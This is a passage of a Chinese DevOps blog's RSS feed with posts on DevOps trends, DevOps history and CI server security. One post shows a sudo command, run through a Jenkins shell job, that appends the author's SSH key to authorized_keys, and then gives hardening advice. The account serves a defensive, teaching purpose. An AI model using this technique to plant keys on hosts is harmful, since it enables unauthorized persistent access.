的爱好者，十分高兴能在这一过程中看到 DevOps 未来发展的几个趋势，总结成了这篇文章。
趋势1：微服务目前仍然是 DevOps 技术应用和发展的主要领域 # 微服务将单块应用系统切割为多个简单独立的应用。从技术上说，这是通过工具把应用程序的内部复杂度转化为外部复杂度，需要一系列工具支撑微服务本身以及服务之间的通信。从组织上说，微服务团队要满足“快速发布，独立部署”的能力，则必须具备 DevOps 的工作方式。
如何拆解微服务一直是微服务技术应用的最大难点之一，领域驱动设计是比较理想的微服务拆解方法论。社会化代码分析帮助团队通过更精确的数据找到更加合适的拆分点。CodeScene是一个在线服务，它能帮助识别出热点和复杂且难以维护的子系统，通过分析分布式子系统在时间上的耦合发现子系统之间的耦合。此外，它还能帮你认识组织中的康威定律，这会大大降低微服务解耦的难度。
此外，微服务系统本质上是一个分布式系统，分布式系统之间的通信一直是很重要的问题。本期介绍的Kafka Streams和OpenTracing就是这类技术的条目。Kafka 作为一个成熟的分布式消息系统已经被广泛采用，而 Kafka Streams 则将最佳实践以“库”的方式呈现给开发人员，使得操作 Kafka 更加自然和简单。而 OpenTracing 则弥补了跨越多个微服务之间请求追踪的空白。
另一方面，**无服务器风格的架构（Serverless architecture ）**把 DevOps 技术在微服务领域的应用推向极致。当应用程序执行环境的管理被新的编程模型和平台取代后，团队的交付生产率得到了进一步的提升。一方面它免去了很多环境管理的工作，包括设备、网络、主机以及对应的软件和配置工作，使得软件运行时环境更加稳定。另一方面，它大大降低了团队采用 DevOps 的技术门槛。然而，端到端的交付以及微服务中的函数管理问题日渐突出，尽管AWS API gateway和AWS Lambda几乎成了 Serverless 架构的代名词，但这二者结合的开发者体验并不佳。于是出现了Serverless framework和CLAUDIA这样的管理工具。
AWS Lambda 带来的优势也深深影响了企业级应用领域，Apache OpenWhisk就是企业级无服务器领域的选择之一，它使得企业级应用也可以采用无服务器风格的架构构建应用程序。
在微服务端到端交付流程上，Netflix 开源了自家的Spinnaker，Netflix 作为微服务实践的先锋，不断推出新的开源工具来弥补社区中微服务技术和最佳实践的缺失。 而Spring Cloud则为开发者提供了一系列工具，以便他们在所熟悉的 Spring 技术栈下使用这些服务协调技术(coordination techniques)，如服务发现、负载均衡、熔断和健康检查。
而在微服务的安全上，最常见的需求之一是通过身份验证和授权功能来保护服务或 API。 这部分功能往往是最重要且不断重复构造的。而Keycloak就是一个开源的身份和访问管理解决方案，用于确保应用程序或微服务的安全。且几乎不需要编写代码，开箱即用。它支持单点登录，社交网络登录和标准协议登录(如 OpenID Connect ， OAuth2 和 SAML 等)。
趋势2：以 Docker 为核心的数据中心方案逐渐走向成熟 # 在过去的两年，Docker 社区有了突飞猛进的发展，似乎每期技术雷达都会出现 Docker 相关的条目。而 Docker 往往和 DevOps 联系起来，被认为是推动 DevOps 发展的杀手级工具，以至于有些人会以团队是否采用 Docker 作为团队是否具备 DevOps 能力的标志。
而这一社区的创新数量则日渐平缓。一方面，开源社区激烈的竞争淘汰了一部分技术。另一方面，以 Docker 为中心的完整数据中心解决方案在不断的整合开源社区的零散工具并形成最佳实践。为端到端的开发和运维提供更完整的交付体验，各大厂商也相继开始推广自己的企业级整体收费解决方案，这表明 Docker 的使用已经走向成熟。
在本期的技术雷达里的条目中出现了Mesosphere DC/OS，这是构建统一技术栈数据中心的一个征兆。在这方面Docker EE和Rancher都是非常有力的竞争者。根据我的判断，在未来的 Docker 社区里，统一容器化数据中心的竞争者将会进一步减少。而之前的私有云方案则慢慢会被“以 Docker 为核心数据中心级全栈交付”取代。
趋势3：不完整的 DevOps 实践阻碍着 DevOps 的发展 # 很遗憾看到单一持续集成实例和不完整的持续集成（CI Theatre）这样的条目出现在技术雷达里。可以感到企业应用 DevOps 技术的紧迫性。这同时也暴露了 DevOps 领域里“缺乏门槛较低且成熟的 DevOps 实践”的问题。</description></item><item><title>不要让你的持续集成服务器成为安全隐患</title><link>https://wwww.guyu.me/posts/2017-03-03-your-ci-may-be-under-attack/</link><pubDate>Fri, 03 Mar 2017 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2017-03-03-your-ci-may-be-under-attack/</guid><description>最近临时接手了一个客户测试环境和产品环境的维护工作。接手的客户资产里包含：代码库，生产环境主机，测试环境主机以及搭建在测试环境主机上的CI（基于Jenkins）。这个CI可以用来部署测试环境和生产环境的应用。
不久，接到了客户的一个维护请求：把最新的生产环境数据同步到测试环境里。
这个维护工作需要通过SSH登录到测试环境主机上进行操作。测试主机是通过 authorized_keys 进行 SSH 认证的，因此没有用户名和密码。这样有两个好处：一方面无需生产环境用户名密码。一方面可以按需吊销不再用的客户端。这样可以避免密码泄露。所以我需要把自己的 ssh public key 交给管理员，让他把我的 key 加到可访问列表里。
悲剧的是，管理员告诉我他的 key 因为更换电脑的关系没有及时更新。所以，他也登录不上去了。而且之前所有的管理员的 key 都失效了。我手上只有CI的管理员的用户名和密码，于是一个邪恶的想法就诞生了：
既然 CI 可以执行脚本，那么我是否可以通过CI把我的key注入进去 ？
于是我用Execute Shell的Job变成了我的命令行，通过CI运行日志得知了宿主用户的文件目录信息。然后把自己的ssh public key加到了登录列表里（此处省略敏感信息）：
sudo sh -c “cp \~/.ssh/authorized\_keys \~/.ssh/authorized\_keys.bak” sudo sh -c &amp;#34;echo ‘{**你的****ssh public key**}’ \&amp;gt;\&amp;gt; \~/.ssh/authorized\_keys&amp;#34; It works !
我成功的登录了机器，但这却暴露了一个问题：CI有可能会成为一个安全隐患。
首先，CI可以执行代码。这就意味着它有可能执行有害代码。
其次，CI缺乏足够的用户鉴权，这很有可能导致未授权用户访问。
那么，如何构建一个更安全的 CI 服务器 # rootless原则 # “神操纵着万物，你感觉得到他，但永远看不见他。” ——《圣经·希伯来书 11:27》
在服务器的世界里，root用户就是神，具有至高的权力和力量。如果有人获得了”神力“，后果可能不堪设想。
无论是Web服务器，还是CI服务器。都是这个世界里的二等公民，权限和力量都应该受到约束。执行的时候应该“
此外，应该极力避免sudo的滥用，尤其是对那些从外部访问的用户。很多情况下，为了操作方便，很多用户都有sudo的权限。但这恰恰造成了低权限用户提升自己的访问权限进行有害操作。
在上述的故事里，因为没有对Jenkins的主机用户做有效的隔离，导致了我可以用sudo注入自己的key获得机器的访问权限。
沙盒隔离原则 # 因为CI会执行脚本或运行程序，而这些程序和脚本极有可能是不安全的。所以，CI任务应该在隔离的安全沙盒中执行，例如：受限的用户，受限的权限，受限的空间。
在上述的故事里，我就通过CI执行了一段不安全的脚本成功获得了登录主机的权限。
如果这些任务执行在隔离并受控的Docker容器里，那么会安全得多。
也可以考虑采用TravisCI这样的第三方CI服务来保证安全性。
备份和备份核查原则 # 在上述的故事里，因为缺乏有效的备份机制，导致了所有人都失去了对主机的访问。此外，我在修改authorized_keys的时候先进行了备份。这样，如果我注入失败，还可以还原。
这里的备份，不光是对配置，数据的备份，还有岗位的备份。
如果有备份的管理员，完全不会出现这种事情。
如果有备份QA服务器，完全可以不需要当前的QA服务器。
在做任何变更前，都应该做好备份以及还原的准备。因为任何变更都会带来“蝴蝶效应”。
但是，光备份是不够的。如果备份不能有效还原，那和没有备份没有什么区别。所以，要定时的进行备份恢复测试。确保备份在各种情况下可用。
多重要素身份验证原则 # 上述的CI是暴露在互联网中的，任何一个人访问到这个站点，通过一定程度的密码破解，就可以获得这个CI的访问控制权限。从而可以做出上述的操作。
所以，有了用户名和密码，并不一定是可信用户。所以需要通过更多的手段，诸如手机短信验证码或者第三方认证集成来验证用户的身份。
关键操作手动验证原则 # 试想一下，如果上述的例子我并没有服务器的访问权限。而是通过提交未经审查的代码自动运行测试脚本。实际上也会造成同样的效果。
有时候我们会为了方便，让CI自动触发测试。但是，恰恰是这种“方便”，却带来了额外的安全隐患。而这样的方便，不光方便了自己，也方便了恶意入侵者。
所以，不能为了方便而留下安全隐患。在关键操作上设置为手动操作，并通过一定的机制保证关键操作的可靠性才是最佳实践。
构建安全 CI 的几个实践 # 采用Sibling的方式在Docker里运行CI任务。 账户密码管理统一采用LDAP认证，如果过期则从外部修改。 CI的登录权限和其它的认证方式（比如GItHub，Okta等）集成起来。并用组限制登录。 对于生产环境的CI，通过更加细粒度的权限限制来隔离一些危险操作。 官方的安全指南 # 不少CI软件的官方都提供了最佳实践以及安全指南帮助我们更好的构建CI服务器。请务必在构建CI前阅读并理解这些安全实践和措施，并遵照安全最佳实践构建CI服务器：
Jenkins 最佳实践：https://wiki.jenkins-ci.org/display/JENKINS/Jenkins+Best+Practices</description></item><item><title>DevOps 前世今生 - DevOps 的目标和核心</title><link>https://wwww.guyu.me/posts/2017-02-14-core-devops-concepts/</link><pubDate>Tue, 14 Feb 2017 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2017-02-14-core-devops-concepts/</guid><description>在#DevOps的前世今生# 2. Dev和Ops矛盾缘何而来？一文中，通过Dev和Ops的历史发展总结出了Dev和Ops矛盾的历史渊源，以及 Dev 和 Ops 的核心矛盾：
Dev和Ops 的矛盾主要是面向适应性的敏捷软件交付和面向经验性的传统运维之间的矛盾。
但这个矛盾最先 John Allspaw 和 Paul Hammond在 “10+ Deploys Per Day： Dev and Ops Cooperation at Flickr” 提出，并以“Cooperation”作为整个演讲的核心，讲述了他们解决这个矛盾的实践经验。这个演讲中：
重新定义Ops的工作目标 # 在一个组织中，如果相关利益者的利益不一致，在既定流程的进行中一定会碰到诸多阻力。而在这一点上，首先做得就是把 Dev 和 Ops 的利益一致化，从而减少Ops对软件交付的阻力。在演讲中，John Allspaw 和 Paul Hammond 首先挑战的是对 Dev 和 Ops 的传统观点。
传统的观点认为Dev和Ops的工作是不同的：
Dev的工作是增添新的功能。
Ops的工作是保证站点的稳定和高性能。
他们认为，保证站点的稳定和高性能不是 Ops 的工作目标。
Ops的工作目标应该是激活业务（enable the business），而这一点和Dev是一致的。
理想往往是美好的，现实往往是残酷的。激活业务会带来更多的变更，而更多的变更会引起故障！
面对这样的问题，就需要做出一个选择：为了保障稳定性减少变更，还是及时按需变更？
阿拉伯有一个谚语：“你若不想做，会找到一个借口。你若想做，会找到一个方法。”
Flicker 并没有屈服于压力，他们选择让问题向目标妥协，而不是目标向问题妥协。他们的手段是：
构建相互合作的工具和文化 # 降低变更风险的关键就是在于提高可靠性，这不仅仅是Dev在软件开发中，也需要Ops把可靠性通过非功能性需求（性能要求，扩展性，安全性等）注入到软件开发过程中。通过系统交付过程中的质量內建而不是事后检验来提升交付质量。
而 Dev 和 Ops 的具体矛盾点表现在以下两方面：
在价值流下游的 Ops 评审认为价值链上游的 Dev 软件非功能质量不满足要求，因此阻止变更。
在价值流上游的 Dev 无法获得价值链下游的 Ops 的真实运行环境，因此无法提升交付质量。
于是，逐渐陷入了“无法提升质量”和“ 非功能质量不满足要求”的死循环中。
由于在 Dev 环节关心的是功能性需求，往往忽略了非功能性需求，而 Ops 更关注的是非功能性需求。所以通过质量內建，把运维加入开发反馈环。在开发环节中增加非功能性的需求的实现和验收，让 Ops 担任最终的 QA 的角色。从而提升了交付质量，也提升了反馈速度。
首先，他们通过**基础设施自动化（Automated infrastructure）**提升了基础设施准备的质量和效率。
其次，他们搭建了Dev和Ops 交付的桥梁：**共享版本控制（Shared Version Control ）并且通过功能开关（Feature flags ）**管理功能发布。
然后，通过**一步构建和部署（One step build and deploy ）以及频繁进行小变更（Small frequent changes）**提升单向价值流速度并降低部署风险。</description></item><item><title>DevOps 前世今生 - DevOps 矛盾从何而来</title><link>https://wwww.guyu.me/posts/2017-01-17-where-did-devops-issues-come/</link><pubDate>Fri, 27 Jan 2017 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2017-01-17-where-did-devops-issues-come/</guid><description>在#DevOps的前世今生# 1.DevOps编年史一文中，通过追溯 DevOps 活动产生的历史起源，我们发现了 DevOps 是敏捷思想从软件开发端(Dev)到系统维护端(Ops)的延伸。无论是 DevOpsDays 的创始人 Patrick Debois，还是同时期的 The Agile Admin。都想通过敏捷来改进传统的系统维护工作以及软件开发部门和系统维护部门的合作关系。但是，DevOps 的矛盾从何而来？这还要从 Dev 和 Ops 的起源开始讲起。
上古时代——抱着计算机使用手册，自开发自运维 # 历史要追溯到刚刚出现计算机的时期。当时，软件开发还是少数人通过高学历才能够掌握的技能，那个时候只有“程序”（Program），但没有“软件”（Software），所以那个时候编写程序的人员被称为“程序员”（Programmer）。基本的学习材料还只是计算机设备厂商附送的使用手册。所以，只能先购买设备，再自己培养人才。
最先购买计算机的是科研单位，军队，政府以及少数大型企业。同时组建了新的部门，成立了信息技术部（IT Department)，或者叫信息化办公室（IT Office）。在中国的有些单位里干脆直接叫“电脑部”。他们一个科室，一个办公室主任，外加两三个科级干部和几个科员，专门管理这些电脑的使用情况，并且学习软件编程技术，用程序来解决其它各部门的。
这是最初的IT运维雏形，在这个时期是没有 Dev 和 Ops 之分的，他们统称为 Programmer。由于开发和运维都由同样的人包揽，自己维护自己开发的程序，也可以被看做是原始的 DevOps。这个时期的计算机系统和问题较简单，开发和维护并不复杂，无需进行专业区分。
桌面通用软件时代——软件成为了一门生意，出现了专业的软件开发工程师（Dev） # 随着计算机的成本不断下降，尤其是以 IBM PC 为代表微型计算机（ MicroComputer ）开始普及。企业也开始大规模使用计算机进行办公。由于软件开发人员数量仍然很少，加之需求很旺盛，专业的软件开发人员成本依然高昂。
最开始的时候，软件仅仅通过磁盘拷贝进行流传，某些介绍计算机或者软件的杂志开了先河。程序员通过磁盘向杂志社投稿，杂志社通过变卖杂志和软件获利。由于软件的边际生产成本几乎是0，所以渐渐有人把销售软件变成了一门生意。随着软件的扩展，当初为个人目的（Personal Purpose）所编写的软件渐渐的开始走通用化的路线，慢慢形成了软件产品。接着有了专门从事软件开发的公司，并逐渐成为一个产业。并且有了软件开发工程师（Developer，简称Dev）这个职业。
在这个时期，开发软件仍然是很专业的事情，企业的IT部门要想开发软件的代价十分高昂。因此，大部分单位，组织和企业通过购买的形式获得软件。IT部门逐渐成为了负责信息化采购以及软硬件基本操作培训的部门。此外，由于信息化发展加速，各行各业软件层出不穷，加之软件企业越来越多，IT部门不得不通过更广泛的学习了解技术的变化。
企业级定制化软件时代——企业级应用的快速发展，出现了专业的系统维护工程师（Ops） # 随之带来的问题是：无论企业买来多少软件，企业的信息化需要仍然无法被满足。一台台电脑成为了企业的信息孤岛，解决了信息的分析和存储问题最多实现了无纸化办公。没有让部门间的信息有效的流动起来。大型企业最先发现这些问题并且给出了最初的解决方案，使得企业级软件开发和系统集成（System Integration）慢慢成为了一个热门的领域。
企业级软件系统最大的特点是通过计算机网络解决了企业内部的信息孤岛。但这样的系统无法在PC上运行需要专业的工作站，服务器以及网络设备。而这些设备的管理就理所当然的成为了企业IT部门的职责。
随着软硬件技术的发展，特别企业级应用开发的经验不断积累，设备的采购成本和软件的开发成本进一步降低。大型IT厂商开始瞄准企业级应用市场，尤其是IBM，Oracle和EMC推出了相应的产品。使得软件定制开发的成本不断下降。加之随着开发人员越来越多，开发成本逐渐降低，于是出现了企业定制化软件开发，出现了MIS和ERP这样的应用以及J2EE这样的企业级软件开发框架。
在这个过程中，IT运维的概念逐渐产生，维基百科上是这样定义IT运维（IT Operations）的：
IT Operations is responsible for the smooth functioning of the infrastructure and operational environments that support application deployment to internal and external customers, including the network infrastructure; server and device management; computer operations; IT infrastructure library (ITIL) management; and help desk services for an organization.
翻译成中文就是：
IT运维的责任是要为内部和外部客户的应用部署提供平滑的基础设施和操作环境，包括网络基础设施，服务器和设备管理，计算机操作，ITIL管理，甚至作为组织的IT帮助中心。</description></item><item><title>DevOps 前世今生 - DevOps 编年史</title><link>https://wwww.guyu.me/posts/2016-11-27-devops-annals/</link><pubDate>Sun, 27 Nov 2016 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2016-11-27-devops-annals/</guid><description>2007 年：比利时，一个沮丧的独立IT咨询师 # DevOps的历史要从一个比利时的独立IT咨询师说起。这位咨询师的名字叫做**Patrick Debois，**他喜欢从各个角度研究IT组织。
2007 年，Patrick参与了比利时一个政府下属部门的大型数据中心迁移的项目。在这个项目中，他负责测试和验证工作。所以他不光要和开发团队（Dev）一起工作，也要和运维团队（Ops）一起工作。他第一天在开发团队跟随敏捷的节奏，第二天又要以传统的方式像消防队员那样维护这些系统，这种在两种工作氛围的切换令他十分沮丧。
他意识到开发团队和运维团队的工作方式和思维方式有巨大的差异：开发团队和运维团队生活在两个不同的世界，而彼此又坚守着各自的利益，所以在这两者之间工作到处都是冲突。作为一个敏捷的簇拥者，他渐渐的明白如何在这种状况下改进自己的工作。
2008 年 6月：美国旧金山，第一届 Velocity 大会 # 2008 年，在美国加州旧金山，O&amp;rsquo;Reilly出版公司举办了一场名为Velocity的技术大会，这个大会的话题范围主要围绕Web应用程序的性能和运维展开。这个会议被设计用来分享和交换构建和运维Web应用的性能、稳定性和可用性上的最佳实践。
2008 年 8月：加拿大多伦多，Agile Conference 2008 大会埋下了DevOps的种子 # 同年 8月，在加拿大多伦多的 Agile Conference 2008（敏捷大会）上，一位名为 Andrew Shafer 的人提交了一个名为“Agile Infrastructure”的临时话题。由于对这个临时话题感兴趣的人不多，Andrew 认为没人会对如何 跨越 Dev 和 Ops 的鸿沟 这个话题感兴趣。所以当这个话题时间开始的时候，作为话题提交人的 Andrew 并没有出现。
但是话题开始的时候，仅有一个人出席。这个人就是上文提到的IT咨询师 Patrick 。Partrik 在这次会议上分享了自己的话题：**如何在运维工作中应用 Scrum 和其它敏捷实践。**他十分想把这些经历和别人分享。
最终，Patrick 在会议厅的走廊里找到了 Andrew，并进行了一场漫长的讨论。他们意识到在这次会议之外会有很多的人想要继续探讨这个广泛而又系统化的问题。
尽管在这次会议中，持续集成的流行已经使敏捷实践慢慢走向部署了。可是这仍然把运维工作和开发完全割裂开。于是他俩决定在 Google Group 上建立了一个 Agile System Adminstration 的讨论组继续这个话题。虽然有一些话题和参与者，但是访问者寥寥。
2009 年 6月：美国圣荷西，第二届 Velocity 大会上一个轰动世界的演讲 # 这一年的 Velocity 大会最大的亮点是一个名为“10+ Deploys Per Day: Dev and Ops Cooperation at Flickr”的演讲，几乎所有的和 DevOps 相关的资料都会把这个演讲作为 DevOps 的引用。这个演讲的内容可以作为 DevOps 萌发的标志。这个演讲提出了了 DevOps 的“一个中心，两个基本点”——以业务敏捷为中心，构造适应快速发布软件的工具（Tools）和文化（Culture）。
Patrick 在网上看到了这个视频后很兴奋，因为这就是他一直致力于的领域。于是他在Twitter 上问如何才能参加 Velocity 大会。
其中有个人回复: 嘿，Patrick，你想在比利时召开自己的 Velocity 吗？我们都会去参加，这一定会很棒。于是，Patrick 就想通过 Twitter 召集开发工程师和运维工程师在比利时举办一个类似于 Velocity 的大会。
2009 年 10 月：比利时根特，第一届 DevOpsDays # 如果要召开一个会议，就得有一个名字。Patrick 首先就想到了Dev和Ops，由于这个会议会持续两天，所以他加上了 Days，于是就有了 DevOpsDays。由于 Twitter 上有140个字符的限制，因此他想用 DOD 作为 DevOpsDays 的缩写以提醒自己“死在交付上”（Dead On Delivery），但不知什么原因，最后没有这么做。</description></item></channel></rss>